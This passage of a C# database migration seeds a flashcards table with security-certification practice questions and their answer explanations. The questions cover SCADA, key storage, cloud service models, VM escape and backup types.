                values: new object[] { 238, "\r\n21. C. SCADA, or Supervisory Control and Data Acquisition\r\nsystems, are commonly used to manage facilities like power\r\nplants. The rest of the options were made up.\r\n", 2, "\r\n21. What type of system is used to control and monitor power plant power generation systems?\r\nA. IPG\r\nB. SEED\r\nC. SCADA\r\nD. ICD\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 253, "\r\n36. A. A hardware security module (HSM) is the most secure way\r\nto store private keys for the e-commerce server. An HSM is a\r\nphysical device that safeguards and manages digital keys. Fulldisk\r\nencryption (FDE) will protect the data on the e-commerce\r\nserver, but it won’t help store the key. It is also difficult to fully\r\nencrypt the e-commerce server drive, since the drive will need to\r\nbe in use for the e-commerce to function. A self-encrypting drive\r\n(SED) is merely automatic full-disk encryption. Softwaredefined\r\nnetworking (SDN) won’t address the issues in this\r\nscenario, since it configures networks via software and does not\r\nprovide secure key storage.\r\n", 2, "\r\n36. Gerard is responsible for secure communications with his company’s e-commerce server. All\r\ncommunications with the server use TLS. What is the most secure option for Gerard to store\r\nthe private key on the e-commerce server?\r\nA. HSM\r\nB. FDE\r\nC. SED\r\nD. SDN\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 239, "\r\n22. D. Prime factorization algorithms and elliptic curve\r\ncryptography are believed to be vulnerable to future quantum\r\ncomputing–driven attacks against cryptographic systems.\r\nAlthough this is largely theoretical at the moment, quantum\r\nencryption may be the only reasonable response to quantum\r\nattacks against current cryptographic algorithms and systems.\r\n", 2, "\r\n22. What major technical component of modern cryptographic systems is likely to be susceptible\r\nto quantum attacks?\r\nA. Key generation\r\nB. Elliptical plot algorithms\r\nC. Cubic root curve cryptography\r\nD. Prime factorization algorithms\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 241, "\r\n24. B. If Olivia wants to ensure that third parties will be unable to\r\nmodify the operating system for Internet of Things (IoT)\r\ndevices, requiring signed and encrypted firmware for operating\r\nsystem updates is an effective means of stopping all but the most\r\nadvanced threats. Setting a default password means that a\r\ncommon password will be known. Checking the MD5sum for\r\nnew firmware versions will help administrators validate that the\r\nfirmware is legitimate, but signed and encrypted firmware is a\r\nmuch stronger control. Finally, regular patching may help\r\nsecure the devices but won’t prevent OS modifications.\r\n", 2, "\r\n24. Olivia needs to ensure an IoT device does not have its operating system modified by\r\nthird parties after it is sold. What solution should she implement to ensure that this does\r\nnot occur?\r\nA. Set a default password.\r\nB. Require signed and encrypted firmware.\r\nC. Check the MD5sum for new firmware versions.\r\nD. Patch regularly.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 242, "\r\n25. B. After quantum encryption and decryption technologies\r\nbecome mainstream, it is generally believed that nonquantum\r\ncryptosystems will be defeated with relative ease, meaning that\r\nquantum cryptography will be required to be secure. Qubits are\r\nquantum bits, not a measure of speed; quantum encryption will\r\nbe the relevant solution in a post-quantum encryption world;\r\nand even very long RSA keys are expected to be vulnerable.\r\n", 2, "\r\n25. What statement is expected to be true for a post-quantum cryptography world?\r\nA. Encryption speed will be measured in qubits.\r\nB. Nonquantum cryptosystems will no longer be secure.\r\nC. Quantum encryption will no longer be relevant.\r\nD. Key lengths longer than 4,096 bits using RSA will be required.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 243, "\r\n26. B. Counter mode (CTR) makes a block cipher into a stream\r\ncipher by generating a keystream block using a nonrepeating\r\nsequence to fill in the blocks. This allows data to be streamed\r\ninstead of waiting for blocks to be ready to send. It does not\r\nperform the reverse, turning a stream cipher into a block cipher,\r\nnor does it reverse the encryption process (decryption). Public\r\nkeys cannot unlock private keys; they are both part of an\r\nasymmetric encryption process.\r\n", 2, "\r\n26. What function does counter mode perform in a cryptographic system?\r\nA. It reverses the encryption process.\r\nB. It turns a block cipher into a stream cipher.\r\nC. It turns a stream cipher into a block cipher.\r\nD. It allows public keys to unlock private keys.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 244, "\r\n27. D. Blockchain public ledgers contain an identity for\r\nparticipants (although the identity may be semi-anonymous),\r\nthe transaction record, and the balance or other data that the\r\nblockchain is used to store. Since there is no central authority,\r\nthere is no token to identify authorities.\r\n", 2, "\r\n27. Which of the following items is not included in a blockchain’s public ledger?\r\nA. A record of all genuine transactions between network participants\r\nB. A record of cryptocurrency balances (or other data) stored in the blockchain\r\nC. The identity of the blockchain participants\r\nD. A token that identifies the authority under which the transaction was made\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 245, "\r\n28. C. A test server should be identical to the production server.\r\nThis can be used for functional testing as well as security testing,\r\nbefore deploying the application. The production server is the\r\nlive server. A development server would be one the\r\nprogrammers use during development of a web application, and\r\npredeployment server is not a term typically used in the\r\nindustry.\r\n", 2, "\r\n28. Suzan is responsible for application development in her company. She wants to have all web\r\napplications tested before they are deployed live. She wants to use a test system that is identical\r\nto the live server. What is this called?\r\nA. A production server\r\nB. A development server\r\nC. A test server\r\nD. A predeployment server\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 246, "\r\n29. C. Staging environments, sometimes called preproduction\r\nenvironments, are typically used for final quality assurance (QA)\r\nand validation before code enters the production environment\r\nas part of a deployment pipeline. Staging environments closely\r\nmirror production, allowing realistic testing and validation to be\r\ndone. Development and test environments are used to create the\r\ncode and for testing while it is being developed.\r\n", 2, "\r\n29. Alexandra is preparing to run automated security tests against the code that developers in her\r\norganization have completed. Which environment is she most likely to run them in if the next\r\nstep is to deploy the code to production?\r\nA. Development\r\nB. Test\r\nC. Staging\r\nD. Production\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 247, "\r\n30. C. Application programming interface (API) keys are frequently\r\nused to meet this need. An API key can be issued to an\r\nindividual or organization, and then use of the API can be\r\ntracked to each API key. If the API key is compromised or\r\nabused, it can be revoked and a new API key can be issued.\r\nFirewall rules written to use public IP addresses can be fragile,\r\nsince IP addresses may change or organizations may have a\r\nbroad range of addresses that may be in use, making it hard to\r\nvalidate which systems or users are using the API. Credentials,\r\nincluding passwords, are not as frequently used as API keys.\r\n", 2, "\r\n30. Chris wants to limit who can use an API that his company provides and be able to log usage\r\nof the API uniquely to each organization that they provide access to. What solution is most\r\noften used to do this?\r\nA. Firewalls with rules for each company’s public IP address\r\nB. User credentials for each company\r\nC. API keys\r\nD. API passwords\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 248, "\r\n31. D. Embedded systems like smart meters typically do not\r\ninclude a SQL server to attack, making SQL injection an unlikely\r\nissue. Derek should focus on securing the traffic from his meter,\r\nensuring that denial-of-service (DoS) attacks are difficult to\r\naccomplish and that remotely disconnecting the meter using\r\nexposed administrative interfaces or other methods is\r\nprevented.\r\n", 2, "\r\n31. Derek has been assigned to assess the security of smart meters. Which of the following is not\r\na common concern for an embedded system like a smart meter?\r\nA. Eavesdropping\r\nB. Denial of service\r\nC. Remote disconnection\r\nD. SQL injection\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 249, "\r\n32. A. Honeypots are systems configured to appear to be\r\nvulnerable. Once an attacker accesses them, they capture data\r\nand tools while causing the attacker to think that they are\r\nsuccessfully gaining control of the system. This allows defenders\r\nlike Selah to study and analyze their techniques and tools\r\nwithout endangering their production systems. An intrusion\r\ndetection system (IDS) or intrusion protection system (IPS) can\r\ndetect and stop attacks, and may even capture some tools, but\r\nthey are not designed to capture local commands and\r\ndownloaded tools. A WAF is a web application firewall and is\r\nintended to stop attacks on web applications.\r\n", 2, "\r\n32. Selah wants to analyze real-world attack patterns against systems similar to what she already\r\nhas deployed in her organization. She would like to see local commands on a compromised\r\nsystem and have access to any tools or other materials the attackers would normally deploy.\r\nWhat type of technology could she use to do this?\r\nA. A honeypot\r\nB. An IPS\r\nC. An IDS\r\nD. A WAF\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 250, "\r\n33. D. Honeynets are intentionally vulnerable networks set up to\r\nallow for capture and analysis of attacker techniques and tools.\r\nA black hole is a term commonly used for a system or network\r\ndevice where traffic is discarded, and black hole routing involves\r\nsending traffic to a null route that goes nowhere.\r\n", 2, "\r\n33. Charles sets up a network with intentional vulnerabilities and then instruments it so that\r\nhe can watch attackers and capture details of their attacks and techniques. What has\r\nCharles set up?\r\nA. A black hole\r\nB. A honeyhole\r\nC. A spynet\r\nD. A honeynet\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 251, "\r\n34. B. Maria should implement ongoing auditing of the account\r\nusage on the SCADA system. This will provide a warning that\r\nsomeone’s account is being used when they are not actually\r\nusing it. Host-based antivirus is almost never a bad idea, but this\r\nscenario did not indicate that the compromise was due to\r\nmalware, so antimalware may not address the threat. Since the\r\nengineer has access to the SCADA system, a network intrusion\r\nprevention system (NIPS) is unlikely to block them from\r\naccessing the system, and full-disk encryption (FDE) will not\r\nmitigate this threat because the system is live and running,\r\nmeaning that the disk will be decrypted in use.\r\n", 2, "\r\n34. Maria is a security engineer with a manufacturing company. During a recent investigation,\r\nshe discovered that an engineer’s compromised workstation was being used to connect to\r\nSCADA systems while the engineer was not logged in. The engineer is responsible for administering\r\nthe SCADA systems and cannot be blocked from connecting to them. What should\r\nMaria do to mitigate this threat?\r\nA. Install host-based antivirus software on the engineer’s system.\r\nB. Implement account usage auditing on the SCADA system.\r\nC. Implement an NIPS on the SCADA system.\r\nD. Use FDE on the engineer’s system.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 240, "\r\n23. C. Geoff is looking for a warm site, which has some or all of the\r\ninfrastructure and systems he needs but does not have data. If a\r\ndisaster occurs, Geoff can bring any equipment that he needs or\r\nwants to the site along with his organization’s data to resume\r\noperations. A hot site is a fully functional environment with all\r\nthe hardware, software, and data needed to operate an\r\norganization. They are expensive to maintain and run but are\r\nused by organizations that cannot take the risk of downtime. A\r\ncold site is a location that can be brought online but does not\r\nhave systems; cold sites typically have access to power and\r\nbandwidth but need to be fully equipped to operate after a\r\ndisaster since they are just rented space. An RTO is a recovery\r\ntime objective, and it measures how long it should take to\r\nresume operations; it is not a type of disaster recovery site.\r\n", 2, "\r\n23. Geoff wants to establish a contract with a company to have datacenter space that is equipped\r\nand ready to go so that he can bring his data to the location in the event of a disaster. What\r\ntype of disaster recovery site is he looking for?\r\nA. A hot site\r\nB. A cold site\r\nC. A warm site\r\nD. An RTO site\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 281, "\r\n64. A. VM escape is a situation wherein an attacker is able to go\r\nthrough the VM to interact directly with the hypervisor and\r\npotentially the host operating system. The best way to prevent\r\nthis is to limit the ability of the host and the VM to share\r\nresources. If possible, they should not share any resources.\r\nPatching might mitigate the situation, but it is not the most\r\neffective solution. Using firewalls and antimalware tools is a\r\ngood security practice but would have minimal effect on\r\nmitigating VM escape.\r\n", 2, "\r\n64. Mary is responsible for virtualization management in her company. She is concerned about\r\nVM escape. Which of the following methods would be the most effective in mitigating\r\nthis risk?\r\nA. Only share resources between the VM and host if absolutely necessary.\r\nB. Keep the VM patched.\r\nC. Use a firewall on the VM.\r\nD. Use host-based antimalware on the VM.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 282, "\r\n65. A. Irene is looking for a software-as-a-service (SaaS) tool that\r\nallows her to perform the specific function that her organization\r\nneeds to accomplish. An SaaS service does not require system\r\nadministration or programming and typically requires minimal\r\nconfiguration to perform its normal functionality. Platform-asa-\r\nservice (PaaS) typically requires some configuration or\r\nprogramming, and infrastructure-as-a-service (IaaS) will require\r\nsystems administration, programming, or configuration—or all\r\nthree! Identity-as-a-service (IDaaS) is a specific type of solution\r\nthat was not described as part of Irene’s needs.\r\n", 2, "\r\n65. Irene wants to use a cloud service for her organization that does not require her to do any\r\ncoding or system administration, and she wants to do minimal configuration to perform the\r\ntasks that her organization needs to accomplish. What type of cloud service is she most likely\r\nlooking for?\r\nA. SaaS\r\nB. PaaS\r\nC. IaaS\r\nD. IDaaS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 283, "\r\n66. D. Serverless architectures do not require a system\r\nadministrator because the provider manages the underlying\r\nfunction-as-a-service (FaaS) capability. It can also scale up or\r\nscale down as needed, allowing it to be very flexible. Serverless\r\narchitectures are typically not ideal for complex applications and\r\ninstead tend to work better for microservices.\r\n", 2, "\r\n66. Which of the following is not an advantage of a serverless architecture?\r\nA. It does not require a system administrator.\r\nB. It can scale as function call frequency increases.\r\nC. It can scale as function call frequency decreases.\r\nD. It is ideal for complex applications.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 313, "\r\n96. B. This is an example of a continuous integration/continuous\r\ndelivery (CI/CD) pipeline. There is no mention of monitoring\r\nsystems, and although code analysis is happening here in\r\ntesting, it is dynamic testing, not source code analysis. There is\r\nno mention of malware in the pipeline.\r\n", 2, "\r\n96. What process is shown in the following figure?\r\nBuild\r\noccurs\r\nTests\r\nrun\r\nTests\r\nrun\r\nDeploy to\r\nstaging\r\nDeploy to\r\nproduction\r\nChange\r\ncommitted\r\nA. A continuous monitoring environment\r\nB. A CI/CD pipeline\r\nC. A static code analysis system\r\nD. A malware analysis process\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 314, "\r\n97. D. Although gait analysis is not commonly used for\r\nidentification and authorization purposes, it is used in situations\r\nwhere crowd footage is available to identify individuals. Vein,\r\nvoiceprint, and fingerprint analysis are not useful in most\r\nscenarios involving heavily used and crowded spaces.\r\n", 2, "\r\n97. Keith wants to identify a subject from camera footage from a train station. What biometric\r\ntechnology is best suited to this type of identification?\r\nA. Vein analysis\r\nB. Voiceprint analysis\r\nC. Fingerprint analysis\r\nD. Gait analysis\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 315, "\r\n98. C. A community cloud presents a compromise solution.\r\nCommunity clouds are semi-private. They are not accessible to\r\nthe general public but only to a small community of specific\r\nentities. There are risks with public clouds, as there are with any\r\nenvironment. Private clouds can be quite expensive to build out,\r\nparticularly for smaller organizations that cannot afford staffing\r\nor hardware. Finally, recommending against a cloud solution\r\ndoes not match the company’s stated goal.\r\n", 2, "\r\n98. Your company is interested in keeping data in the cloud. Management feels that public\r\nclouds are not secure but is concerned about the cost of a private cloud. What is the solution\r\nyou would recommend?\r\nA. Tell them there are no risks with public clouds.\r\nB. Tell them they will have to find a way to budget for a private cloud.\r\nC. Suggest that they consider a community cloud.\r\nD. Recommend against a cloud solution at this time.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 316, "\r\n99. D. Using infrastructure as a service (IaaS) makes the most\r\nsense here; it meets the cloud requirement described and would\r\nallow additional systems to be quickly created or removed as\r\nneeded. Platform as a service (PaaS) does not provide direct\r\naccess to Linux systems to build out applications and related\r\nconfiguration. Setting up dual boot and building machines are\r\nnot cloud solutions as described. When you answer questions\r\nlike this, make sure you read and meet all the requirements in\r\nthe question.\r\n", 2, "\r\n99. Your development team primarily uses Windows, but they need to develop a specific solution\r\nthat will run on Linux. What is the best solution to get your programmers access to Linux\r\nsystems for development and testing if you want to use a cloud solution where you could run\r\nthe final systems in production as well?\r\nA. Set their machines to dual-boot Windows and Linux.\r\nB. Use PaaS.\r\nC. Set up a few Linux machines for them to work with as needed.\r\nD. Use IaaS.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 317, "\r\n100. A. One of the dangers of automation and scripting is that the\r\nscripts will do exactly what they are written to do. That means\r\nthat a script like those that Corrine has been asked to write that\r\ndoesn’t have rules that prevent it from blocking critical systems\r\ncould block those systems. There is no indication in the question\r\nof any issues with private IP addresses, and filtering them would\r\nrequire more work. Attackers could potentially use the scripts if\r\nthey discovered them, but if they’re able to access security\r\nscripts there is likely a deeper problem. Finally, auditors\r\ntypically do not review scripts and instead ask about the\r\nexistence of controls.\r\n", 2, "\r\n100. Corrine has been asked to automate security responses, including blocking IP addresses\r\nfrom which attacks are detected using a series of scripts. What critical danger should she\r\nconsider while building the scripts for her organization?\r\nA. The scripts could cause an outage.\r\nB. The scripts may not respond promptly to private IP addresses.\r\nC. Attackers could use the scripts to attack the organization.\r\nD. Auditors may not allow the scripts.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 318, "\r\n101. D. Differential backups back up all of the changes since the last\r\nfull backup. An incremental backup backs up all changes since\r\nthe last incremental backup. A snapshot captures machine state\r\nand the full drive at a bitwise level, and full backups are a\r\ncomplete copy of a system but typically do not include the\r\nmemory state.\r\n", 2, "\r\n101. Madhuri has configured a backup that will back up all of the changes to a system since the\r\nlast time that a full backup occurred. What type of backup has she set up?\r\nA. A snapshot\r\nB. A full backup\r\nC. An incremental backup\r\nD. A differential\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 319, "\r\n102. C. The correct answer is a public cloud. Public clouds are\r\nusually less expensive. The cloud provider has a number of\r\ncustomers and costs are dispersed. Even individuals can afford\r\nto use cloud storage with services like iCloud and Amazon\r\nCloud. A community cloud is usually private for a small group of\r\npartners. Each of the partners must share a greater part of the\r\nexpense than they would with a public cloud, but they retain\r\nmore control over the cloud than they would with a public cloud.\r\nPrivate clouds are often the most expensive for smaller\r\norganizations. The company must completely develop and\r\nmaintain the cloud resources and cannot leverage shared\r\nresources. A hybrid deployment model is a good compromise for\r\nmany situations, but it will typically be more expensive than a\r\npublic cloud for a small organization.\r\n", 2, "\r\n102. You are the CIO for a small company. The company wants to use cloud storage for some\r\nof its data, but cost is a major concern. Which of the following cloud deployment models\r\nwould be best?\r\nA. Community cloud\r\nB. Private cloud\r\nC. Public cloud\r\nD. Hybrid cloud\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 320, "\r\n103. C. The crossover error rate (CER) is the point where the FAR\r\n(false acceptance rate) and the FRR (false rejection rate) cross\r\nover. CER provides a means of comparing biometric systems\r\nbased on their efficiency, with a lower CER being more\r\ndesirable.\r\n", 2, "\r\n103. What is the point where false acceptance rate and false rejection rate cross over in a biometric\r\nsystem?\r\nA. CRE\r\nB. FRE\r\nC. CER\r\nD. FRR\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 321, "\r\n104. B. Elasticity is a cloud computing concept that matches\r\nresources to demand to ensure that an infrastructure closely\r\nmatches the needs of the environment. Scalability is the ability\r\nto grow or shrink as needed but does not directly include the\r\nconcept of matching to workload. Normalization is a code\r\ndevelopment concept used to ensure that data is in a consistent\r\nform.\r\n", 2, "\r\n104. Devin is building a cloud system and wants to ensure that it can adapt to changes in its\r\nworkload by provisioning or deprovisioning resources automatically. His goal is to ensure\r\nthat the environment is not overprovisioned or underprovisioned and that he is efficiently\r\nspending money on his infrastructure. What concept describes this?\r\nA. Vertical scalability\r\nB. Elasticity\r\nC. Horizontal scalability\r\nD. Normalization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 322, "\r\n105. A. An uninterruptable power supply (UPS) should be\r\nNathaniel’s first priority. Ensuring that power is not disrupted\r\nduring an outage and can be maintained for a short period until\r\nalternate power like a generator can come online is critical, and\r\na UPS can provide that capability. A generator alone will take\r\nlonger to come online, resulting in an outage. Dual power\r\nsupplies can help to build resilience by allowing multiple power\r\nsources and avoiding issues if a power supply does fail, but that\r\nis not the focus of the question. A managed power distribution\r\nunit (PDU) provides remote management and power monitoring\r\nbut will not prevent power loss in an outage.\r\n", 2, "\r\n105. Nathaniel wants to improve the fault tolerance of a server in his datacenter. If he wants to\r\nensure that a power outage does not cause the server to lose power, what is the first control\r\nhe should deploy from the following list?\r\nA. A UPS\r\nB. A generator\r\nC. Dual power supplies\r\nD. Managed power units (PDUs)\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 323, "\r\n106. B. Virtual machine (VM) sprawl refers to a situation in which\r\nthe network has more virtual machines than the IT staff can\r\neffectively manage. The remaining options do not match the\r\nterm VM sprawl.\r\n", 2, "\r\n106. Which of the following is the best description for VM sprawl?\r\nA. When VMs on your network outnumber physical machines\r\nB. When there are more VMs than IT can effectively manage\r\nC. When a VM on a computer begins to consume too many resources\r\nD. When VMs are spread across a wide area network\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 312, "\r\n95. C. Standard naming conventions typically do not help to\r\nconceal systems from attackers. Attackers can still scan for\r\nsystems and may even be able to use the naming convention to\r\nidentify the purpose of a system if the naming convention\r\nincludes a purpose or technology in the name. Naming\r\nconventions do make standardization easier and can help\r\nadministrators quickly identify what a machine does, while\r\nmaking it simpler to include systems in scripts. A machine that\r\ndoesn’t match is likely to be a rogue or misconfigured.\r\n", 2, "\r\n95. Using standard naming conventions provides a number of advantages. Which of the\r\nfollowing is not an advantage of using a naming convention?\r\nA. It can help administrators determine the function of a system.\r\nB. It can help administrators identify misconfigured or rogue systems.\r\nC. It can help conceal systems from attackers.\r\nD. It can make scripting easier.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 324, "\r\n107. C. Stored procedures are commonly used in many database\r\nmanagement systems to contain SQL statements. The database\r\nadministrator (DBA), or someone designated by the DBA,\r\ncreates the various SQL statements that are needed in that\r\nbusiness, and then programmers can simply call the stored\r\nprocedures. Stored procedures are not related to dynamic linked\r\nlibraries (DLLs). Stored procedures can be called by other stored\r\nprocedures that are also on the server. Finally, stored\r\nprocedures are not related to middleware.\r\n", 2, "\r\n107. Which of the following is the best description of a stored procedure?\r\nA. Code that is in a DLL, rather than the executable\r\nB. Server-side code that is called from a client\r\nC. SQL statements compiled on the database server as a single procedure that can be\r\ncalled\r\nD. Procedures that are kept on a separate server from the calling application, such as in\r\nmiddleware\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 326, "\r\n109. D. Selah should be concerned about cloning the badges because\r\nmagnetic stripe badges are relatively simple to clone in most\r\ncases. Tailgating is common, particularly if there are large\r\nnumbers of employees, since employees are unlikely to allow\r\ndoors to close and then reopen them for every person who enters\r\nduring shift changes. Since magnetic stripe readers do not\r\nrequire any additional information, use by unauthorized\r\nindividuals is easy if a badge is lost or stolen.\r\n", 2, "\r\n109. The large company that Selah works at uses badges with a magnetic stripe for entry access.\r\nWhich threat model should Selah be concerned about with badges like these?\r\nA. Cloning of badges\r\nB. Tailgating\r\nC. Use by unauthorized individuals\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 327, "\r\n110. A. Virtual machine (VM) escape attacks rely on a flaw in the\r\nhypervisor that could allow an attacker to attack the hypervisor\r\nitself. Typical system administration best practices can help,\r\nincluding regular patching of the hypervisor, but in the event of\r\na successful escape attack, limiting damage by keeping VMs of\r\nthe same sensitivity level isolated to the same host can prevent\r\nbroader impact. Antivirus is always a good idea and may even\r\nstop some malware-based VM escape attacks, but isolating the\r\nVM is more effective. Full-disk encryption (FDE) will have no\r\neffect since the disk must be unencrypted during operation. A\r\nTrusted Platform Module (TPM) is used for storing\r\ncryptographic keys.\r\n", 2, "\r\n110. You are concerned about VM escape attacks causing a significant data breach. Which of the\r\nfollowing would provide the most protection against this?\r\nA. Separate VM hosts by data type or sensitivity.\r\nB. Install a host-based antivirus on both the VM and the host.\r\nC. Implement FDE on both the VM and the host.\r\nD. Use a TPM on the host.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 328, "\r\n111. C. Managed security service providers (MSSPs) are an outside\r\ncompany that handles security tasks. Some or even all security\r\ntasks can be outsourced, including intrusion detection and\r\nprevention (IDS/IPS) management, security information and\r\nevent management (SIEM) integration, and other security\r\ncontrols. Software-defined networking (SDN) would make\r\nmanaging security somewhat easier but would itself be difficult\r\nto implement. Automating as much security activity as is\r\npractical would help alleviate the problem but would not be as\r\neffective as security as a service. Finally, only implementing a\r\nfew security controls would likely leave control gaps.\r\n", 2, "\r\n111. Teresa is the network administrator for a small company. The company is interested in a\r\nrobust and modern network defense strategy but lacks the staff to support it. What would\r\nbe the best solution for Teresa to use?\r\nA. Implement SDN.\r\nB. Use automated security.\r\nC. Use an MSSP.\r\nD. Implement only the few security controls they have the skills to implement.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 329, "\r\n112. B. Cryptographic hashes are used for integrity checking of files,\r\nnetwork packets, and a variety of other applications. Storing a\r\ncryptographic hash of the application and comparing the\r\napplication on the network to that hash will confirm (or refute)\r\nwhether the application has been altered in any way. Network\r\nintrusion detection or network intrusion prevention systems\r\n(NIPSs/NIDSs) are useful, but they won’t prevent an application\r\nfrom being altered. Sandboxing is used to isolate an application,\r\nbut it won’t detect whether it has been tampered with.\r\n", 2, "\r\n112. Dennis is trying to set up a system to analyze the integrity of applications on his network.\r\nHe wants to make sure that the applications have not been tampered with or Trojaned.\r\nWhat would be most useful in accomplishing this goal?\r\nA. Implement NIPS.\r\nB. Use cryptographic hashes.\r\nC. Sandbox the applications in question.\r\nD. Implement NIDS.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 330, "\r\n113. C. Separating the SCADA (Supervisory Control and Data\r\nAcquisition) system from the main network makes it less likely\r\nthat the SCADA system can be affected from the main network.\r\nThis includes malware as well as human action. Softwaredefined\r\nnetworking (SDN) would make isolating the SCADA\r\nsystem easier but would not actually isolate it. Patch\r\nmanagement is always important, but in this case, it would not\r\nhave prevented the issue. Encrypted data transmissions, such as\r\nTLS, would have no effect on this situation.\r\n", 2, "\r\n113. George is a network administrator at a power plant. He notices that several turbines had\r\nunusual ramp-ups in cycles last week. After investigating, he finds that an executable was\r\nuploaded to the system control console and caused this. Which of the following would be\r\nmost effective in preventing this from affecting the SCADA system in the future?\r\nA. Implement SDN.\r\nB. Improve patch management.\r\nC. Place the SCADA system on a separate VLAN.\r\nD. Implement encrypted data transmissions.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 331, "\r\n114. B. Gordon should implement a version numbering scheme and\r\nensure that the proper current version of software components\r\nis included in new releases and deployments. Developers could\r\nstill manually reintroduce old code, but version numbering\r\nhelps to ensure that you have a current version in use. Neither\r\ncontinuous deployment nor continuous integration will prevent\r\nold code from being inserted, and release management may rely\r\non version numbering but won’t prevent it by itself.\r\n", 2, "\r\n114. Gordon knows that regression testing is important but wants to prevent old versions of code\r\nfrom being re-inserted into new releases. What process should he use to prevent this?\r\nA. Continuous integration\r\nB. Version numbering\r\nC. Continuous deployment\r\nD. Release management\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
